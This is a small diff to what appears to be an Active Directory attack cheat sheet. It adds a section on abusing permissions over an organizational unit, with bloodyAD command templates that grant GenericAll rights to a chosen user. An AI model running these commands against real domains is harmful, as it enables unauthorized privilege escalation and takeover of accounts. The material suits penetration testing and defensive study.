@@ -32,6 +32,7 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 {{< tabcontent set1-1 tab2 >}}
 
 ```console
+# Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
@@ -210,3 +211,18 @@ Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
 ```
 
 {{< /tabcontent >}}
+
+---
+
+### Abuse #4 : Add GenericAll to Target User over Organizational Unit (OU)
+
+{{< tab set5 tab1 >}}Linux{{< /tab >}}
+{{< tabcontent set5 tab1 >}}
+
+```console
+# Password
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<TARGET_USER>'
+```
+
+{{< /tabcontent >}}
+
